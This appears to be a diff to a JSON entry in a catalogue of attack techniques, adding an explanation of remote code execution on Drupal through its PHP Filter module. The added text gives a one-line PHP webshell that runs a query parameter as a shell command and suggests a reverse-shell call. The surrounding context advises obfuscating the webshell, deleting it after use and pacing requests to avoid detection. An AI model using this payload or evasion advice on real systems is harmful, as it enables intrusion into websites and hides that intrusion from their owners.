@@ -93,5 +93,6 @@
       "OWASP A04:2021"
     ],
     "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
-  }
+  },
+  "explain": "Gains RCE on Drupal by posting PHP through the PHP Filter module:\n  <?php system($_GET['<rand>']); ?>   a node body that executes the 'rand' query parameter as a shell command\nCreate a node with PHP input format enabled, then hit it with ?<rand>=id (or a reverse-shell one-liner); on newer Drupal you must install the PHP module first since it is no longer bundled."
 }
